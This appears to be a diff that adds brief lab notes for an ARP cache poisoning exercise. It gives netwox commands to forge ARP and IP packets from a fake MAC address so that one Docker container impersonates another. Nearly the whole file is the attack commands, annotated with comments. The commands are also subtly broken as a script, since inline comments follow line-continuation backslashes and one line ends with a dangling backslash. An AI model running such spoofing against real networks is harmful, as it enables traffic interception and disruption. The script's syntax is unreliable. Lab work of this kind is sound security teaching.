@@ -1,0 +1,28 @@
+
+
+Put these into a script
+
+Run these on Machine 1
+
+You pretend to be M2
+You provide a false MAC
+
+
+netwox 33 \
+--device eth0 \                   # Default
+--eth-src 0:a:a:a:a:a \           # False MAC
+--eth-dst 02:42:ac:11:00:04\      # Machine 3's MAC
+--eth-type 2054 \                 # Default
+--arp-op 1 \                      # Default
+--arp-ethsrc 0:a:a:a:a:a \        # False MAC (this will become M2's MAC)
+--arp-ipsrc 172.17.0.3 \          # Machine 2 IP
+--arp-ethdst 02:42:ac:11:00:04 \  # Machine 3's MAC
+--arp-ipdst 172.17.0.4 \          # Machine 3 IP
+
+netwox 56 \
+--device eth0 \               # Default
+--src-ip 172.17.0.3 \         # Machine 2 IP
+--dst-ip 172.17.0.4 \         # Machine 3 IP
+--src-eth 0:a:a:a:a:a \       # False MAC (this will become M2's MAC)
+--dst-eth 02:42:ac:11:00:04 \ # Machine 3's MAC
+
